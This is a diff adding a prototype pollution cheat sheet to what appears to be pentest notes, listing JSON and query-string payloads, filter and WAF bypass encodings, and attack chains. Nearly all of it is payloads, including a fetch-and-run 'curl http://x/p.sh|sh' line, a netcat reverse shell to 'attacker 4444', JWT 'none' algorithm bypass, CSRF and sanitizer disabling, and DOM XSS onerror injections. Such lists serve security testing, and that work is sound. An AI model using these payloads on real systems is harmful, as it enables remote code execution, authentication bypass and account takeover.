@@ -1,3 +1,223 @@
+# **✅ Prototype Pollution Attack – Complete Test Case (with Bypass Cases)**
+
+# **1. List of Vulnerabilities**
+
+1.1 Object Prototype Pollution
+
+1.2 Constructor Prototype Pollution
+
+1.3 Polluting Deep Nested Objects
+
+1.4 DOM Prototype Pollution (Client-Side)
+
+1.5 Server-Side Prototype Pollution (Node.js)
+
+1.6 Bypass Shallow Key Filters
+
+1.7 Polluting JSON Merge / Patch Endpoint
+
+1.8 Pollution via Query Parameters
+
+1.9 Escaping Input Sanitization
+
+1.10 Advanced Payload Chains (Privilege Escalation / RCE)
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+*(Normal Structured Payloads)*
+
+```
+2.1 Basic Prototype Pollution
+{"__proto__":{"polluted":true}}
+```
+
+```
+2.2 Constructor Prototype Pollution
+{"constructor":{"prototype":{"admin":true}}}
+```
+
+```
+2.3 Deep Nested Pollution
+{"a":{"b":{"__proto__":{"isAdmin":1}}}}
+```
+
+```
+2.4 Pollute Global Object.prototype
+{"prototype":{"debug":"enabled"}}
+```
+
+```
+2.5 Function Constructor Pollution
+{"constructor":{"prototype":{"exploit":"yes"}}}
+```
+
+```
+2.6 Array Prototype Pollution
+{"__proto__":{"0":"malicious","length":9999}}
+```
+
+```
+2.7 Query Parameter Pollution
+?__proto__[admin]=true
+```
+
+```
+2.8 JSON Patch Pollution
+{"op":"add","path":"/__proto__/pwn","value":"x"}
+```
+
+```
+2.9 Express.js Body Parser Pollution
+?a[__proto__][admin]=1
+```
+
+```
+2.10 Server Config Pollution
+{"__proto__":{"cacheTTL":0}}
+```
+
+---
+
+# **3. Sample Payloads (Updated With Real Offensive Payloads)**
+
+*(Offensive prototype pollution payloads used for real attack chains)*
+
+```
+3.1 Node.js Command Execution Chain
+{"__proto__":{"shell":"/bin/bash -c 'curl http://x/p.sh|sh'"}}
+```
+
+```
+3.2 Privilege Escalation (User → Admin)
+{"constructor":{"prototype":{"role":"admin"}}}
+```
+
+```
+3.3 JWT Auth Bypass
+{"__proto__":{"algorithms":["none"],"ignoreExpiration":true}}
+```
+
+```
+3.4 Rate Limit Bypass
+{"__proto__":{"rateLimit":0}}
+```
+
+```
+3.5 DOM XSS via innerHTML Pollution
+{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
+```
+
+```
+3.6 Pollute Object.assign() Defaults
+{"__proto__":{"overwrite":true}}
+```
+
+```
+3.7 Path Traversal → File Write Exploit
+{"__proto__":{"recursive":true}}
+```
+
+```
+3.8 Disable Security Sanitizers
+{"__proto__":{"sanitizeFilter":false}}
+```
+
+```
+3.9 Password Policy Bypass
+{"__proto__":{"minPasswordLength":1}}
+```
+
+```
+3.10 CSRF Protection Disable
+{"__proto__":{"csrfEnabled":false}}
+```
+
+---
+
+# **4. Bypass Techniques (Filters, Sanitizers, WAF Evasion)**
+
+*(Same style as Host Header / GraphQL bypass cases)*
+
+```
+4.1 Unicode Bypass
+{"\u005f\u005fproto\u005f\u005f":{"admin":1}}
+```
+
+```
+4.2 Double-Encoded Key Bypass
+%5F%5Fproto%5F%5F[admin]=1
+```
+
+```
+4.3 Mixed Case Bypass
+{"__ProTo__":{"polluted":"yes"}}
+```
+
+```
+4.4 Deep Nesting to Evade Shallow Filters
+{"x":{"y":{"z":{"__proto__":{"pwn":"x"}}}}}
+```
+
+```
+4.5 Array Injection Bypass
+[{"__proto__":{"admin":true}}]
+```
+
+```
+4.6 Dot-Notation Bypass
+?__proto__.role=admin
+```
+
+```
+4.7 Bracket-Notation Bypass
+?__proto__[role]=admin
+```
+
+```
+4.8 Encoded JSON Patch Bypass
+{"op":"add","path":"\/__proto__\/\u0061","value":"pwn"}
+```
+
+```
+4.9 Nested Constructor Override
+{"a":{"constructor":{"prototype":{"hacked":1}}}}
+```
+
+```
+4.10 Polluting via CSP-Bypass (Client-Side)
+?__proto__[nonce]=fakeNonce
+```
+
+---
+
+# **5. Advanced Attack Chains**
+
+*(Prototype Pollution → XSS / RCE / Auth Bypass)*
+
+```
+5.1 Prototype Pollution → DOM XSS
+?__proto__[innerHTML]=<img src=x onerror=alert(1337)>
+```
+
+```
+5.2 Prototype Pollution → JWT "None" Bypass
+{"__proto__":{"algorithms":["none"]}}
+```
+
+```
+5.3 Prototype Pollution → Node RCE
+{"__proto__":{"shell":"/bin/sh -c 'nc attacker 4444 -e /bin/sh'"}}
+```
+
+```
+5.4 Prototype Pollution → NoSQL Injection
+{"__proto__":{"sanitizeFilter":false}}
+```
+
+```
+5.5 Prototype Pollution → Full Account Takeover
+{"constructor":{"prototype":{"role":"superadmin"}}}
+```
 
 01 DOM XSS via client-side prototype pollution
 ===============================================
@@ -575,3 +795,4 @@ POST /my-account/change-address HTTP/2
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ![img](media/1ab8d4296c5fdcdba613e91b65ce2fae.png)
+
